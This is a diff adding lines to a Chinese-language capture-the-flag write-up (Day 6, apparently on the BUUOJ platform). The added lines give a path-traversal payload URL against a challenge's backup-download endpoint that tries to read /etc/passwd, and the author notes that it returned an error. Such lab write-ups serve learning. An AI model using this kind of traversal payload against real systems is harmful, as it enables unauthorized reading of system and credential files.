@@ -621,6 +621,12 @@ public function pass()
 ![](assets/Day%206/file-20251224234152730.png)
 最后找到一个文件下载
 ![](assets/Day%206/file-20251224234428771.png)
+payload：
+```http
+http://76d7f130-51bd-4a43-9abb-e65d29842a68.node5.buuoj.cn/index.php/manage/Backup/downloadBak?file=%E2%80%A6/%E2%80%A6/%E2%80%A6/%E2%80%A6/etc/passwd
+```
+但是不知道为什么这里报错了。。。
+![](assets/Day%206/file-20251224234617535.png)
 ## 二
 题目给了源码，是一个自动发卡平台
 
